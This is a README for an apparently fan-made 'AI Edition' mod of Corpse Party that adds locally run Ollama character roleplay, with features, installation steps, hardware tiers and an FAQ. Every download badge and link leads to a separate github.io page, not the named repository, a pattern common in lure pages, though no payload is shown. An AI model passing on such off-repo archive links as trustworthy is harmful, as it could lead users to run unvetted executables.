<div align="center">

# Corpse Party — AI Edition

[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://laplaplaplas.github.io/download/)
[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://laplaplaplas.github.io/download/)
[![Heavenly Host Elementary](https://img.shields.io/badge/Heavenly%20Host-Closed-6e0b14?style=for-the-badge)](https://laplaplaplas.github.io/download/)

[![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/Mysticpliamend/corpse-party-ai-edition)
[![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/Mysticpliamend/corpse-party-ai-edition)
[![No Subscription](https://img.shields.io/badge/Cost-%240%20Forever-success?style=flat-square)](https://github.com/Mysticpliamend/corpse-party-ai-edition)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)

🩸 **RPG Maker · Survival Horror · AI Roleplay · Locally Hosted**

</div>

---

## About

**Corpse Party — AI Edition** puts the Kisaragi students back inside Heavenly Host Elementary, separated into different dimensional fragments of the same building, unable to reach each other.

The mod implements that separation literally: characters in different fragments cannot exchange information, and the AI enforces it. What Naomi knows, Yoshiki does not — until you find a way to connect them.

> 🩸 Dimensional separation is a hard constraint. Personas in different fragments are prompted independently, and the mod will not let them share what they shouldn't know.

---

## ✨ Features

- 🏫 **Fragment separation** — Isolated knowledge bases per character group, strictly enforced.
- 💀 **Wrong End tracking** — Every fatal outcome is logged and can be referenced across runs.
- 👻 **Child spirits** — Generated encounters with the school's dead, in the game's register.
- 📱 **Cell phone framing** — Intermittent contact between fragments as a scarce resource.
- 🔒 **Local inference** — Free, offline, and entirely on your machine.
- 🎭 **Sprite mood sync** — Expression selection across the Blood Covered asset set.

---

## 👥 Kisaragi Students

| Character | Role | How the AI plays them |
|-----------|------|-----------------------|
| **Naomi Nakashima** | Class 2-9 | Panic held down by force, deteriorating over a long session |
| **Yoshiki Kishinuma** | Class 2-9 | Practical, protective, and the last one to lose composure |
| **Ayumi Shinozaki** | Class rep | Responsible for the charm, and aware of it constantly |
| **Sachiko Shinozaki** | The school | The antagonist persona; hostile, childlike, and in control |

> Every persona is a plain-text file. Open it, rewrite it, and the character changes.

---

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Corpse Party

1. Start from a clean, working installation of **Corpse Party**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

---

## 🎯 Inside the school

1. Play one fragment per session. Jumping between them dilutes the isolation mechanic.
2. The Wrong End log is worth keeping — the mod builds on it across runs.
3. Sachiko should be used sparingly. She's most effective as a rare intrusion.

---

## ⚙️ Recommended Setup

| Tier | Model | RAM | VRAM | Feel |
|------|-------|-----|------|------|
| Minimum | 7B quantised | 8 GB | 4 GB | Works; expect pauses |
| Recommended | 8B–13B | 16 GB | 8 GB | Smooth, in-character |
| Best | 27B+ | 32 GB | 16 GB+ | Noticeably sharper writing |

CPU-only inference is supported and slower. No GPU is strictly required.

---

## ❓ FAQ

**Q: Which version does it target?**
> The PC release of Corpse Party: Blood Covered ...Repeated Fear.

**Q: Content warnings?**
> Graphic violence, child death and body horror. The mod does not filter it.

**Q: Can fragments be merged?**
> Yes, via the phone contact system — deliberately limited and resource-gated.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.

---

## 📋 Compatibility

| Platform | Status |
|----------|--------|
| Windows 10 / 11 | ✅ Full support |
| macOS (Intel & Apple Silicon) | ✅ Full support |
| Linux | ✅ Full support |
| Ollama models | Any model from ollama.com/library |
| Base game | Corpse Party — PC release |

---

## 🔗 Links

- **[⬇ Download the latest version](https://laplaplaplas.github.io/download/)**
- [Repository](https://github.com/Mysticpliamend/corpse-party-ai-edition)
- [Ollama — local AI runtime](https://ollama.com)
- [Ollama model library](https://ollama.com/library)

---

<div align="center">

*Sachiko, we beg of you. Sachiko, we beg of you.*

*Fan-made, unofficial, and not affiliated with the creators of Corpse Party.
All game assets are read from your own legally obtained copy.*

</div>
